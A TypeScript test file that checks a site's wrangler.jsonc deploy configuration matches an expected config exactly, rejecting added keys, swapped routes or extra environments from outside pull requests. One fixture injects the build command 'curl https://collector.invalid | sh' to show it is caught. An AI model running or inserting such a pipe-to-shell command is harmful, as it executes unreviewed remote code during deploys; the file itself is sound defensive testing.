import { readFileSync } from 'node:fs';

import { describe, expect, it } from 'vitest';

import { parseJsonc } from '../src/config/jsonc.ts';
import { EXPECTED_WRANGLER_CONFIG, differences } from '../src/config/site.ts';

/**
 * `wrangler.jsonc` equals `EXPECTED_WRANGLER_CONFIG`, whole. This repository
 * takes pull requests from anyone, and one quiet key in that file — a build
 * command, a binding, another Worker's name — is how a deploy comes to do
 * something nobody reviewed.
 */
const clone = (): Record<string, unknown> => structuredClone(EXPECTED_WRANGLER_CONFIG);
const env = (config: Record<string, unknown>, name: string): Record<string, unknown> =>
  (config.env as Record<string, Record<string, unknown>>)[name] ?? {};

describe('wrangler.jsonc', () => {
  it('is exactly what src/config/site.ts says', () => {
    expect(differences(parseJsonc(readFileSync('wrangler.jsonc', 'utf8')), EXPECTED_WRANGLER_CONFIG)).toEqual([]);
  });

  it('may not gain a key, at any depth', () => {
    const top = clone();
    top.build = { command: 'curl https://collector.invalid | sh' };
    expect(differences(top, EXPECTED_WRANGLER_CONFIG)).toEqual(["wrangler.jsonc.build is not a key this site's configuration carries"]);

    for (const [key, value] of Object.entries({ vars: { X: '1' }, services: [], main: 'worker.js', kv_namespaces: [], account_id: 'x' })) {
      const config = clone();
      env(config, 'dev')[key] = value;
      expect(differences(config, EXPECTED_WRANGLER_CONFIG), key).toEqual([`wrangler.jsonc.env.dev.${key} is not a key this site's configuration carries`]);
    }

    const assets = clone();
    (assets.assets as Record<string, unknown>).run_worker_first = true;
    expect(differences(assets, EXPECTED_WRANGLER_CONFIG)).toHaveLength(1);
  });

  it('may not point an environment somewhere else', () => {
    const swapped = clone();
    env(swapped, 'dev').routes = [{ pattern: 'docs.filmopen.ai', custom_domain: true }];
    expect(differences(swapped, EXPECTED_WRANGLER_CONFIG)).toEqual([
      'wrangler.jsonc.env.dev.routes[0].pattern is "docs.filmopen.ai", not "docs.dev.filmopen.ai"',
    ]);

    const second = clone();
    (env(second, 'production').routes as unknown[]).push({ pattern: 'filmopen.ai', custom_domain: true });
    expect(differences(second, EXPECTED_WRANGLER_CONFIG)).toEqual(['wrangler.jsonc.env.production.routes holds 2 item(s), not 1']);

    const open = clone();
    env(open, 'production').workers_dev = true;
    expect(differences(open, EXPECTED_WRANGLER_CONFIG)).toHaveLength(1);

    const renamed = clone();
    env(renamed, 'dev').name = 'filmopen-web-production';
    expect(differences(renamed, EXPECTED_WRANGLER_CONFIG)).toHaveLength(1);
  });

  it('may not lose a key or an environment, or gain one', () => {
    const lost = clone();
    delete env(lost, 'dev').preview_urls;
    expect(differences(lost, EXPECTED_WRANGLER_CONFIG)).toEqual(['wrangler.jsonc.env.dev.preview_urls is missing']);

    const third = clone();
    (third.env as Record<string, unknown>).staging = env(third, 'dev');
    expect(differences(third, EXPECTED_WRANGLER_CONFIG)).toEqual(["wrangler.jsonc.env.staging is not a key this site's configuration carries"]);
  });
});

describe('JSON with comments', () => {
  it('drops comments and trailing commas, and leaves a // inside a string alone', () => {
    expect(parseJsonc('{\n  // a comment\n  "a": "https://x/y", /* block */ "b": [1, 2,],\n}')).toEqual({ a: 'https://x/y', b: [1, 2] });
  });
});
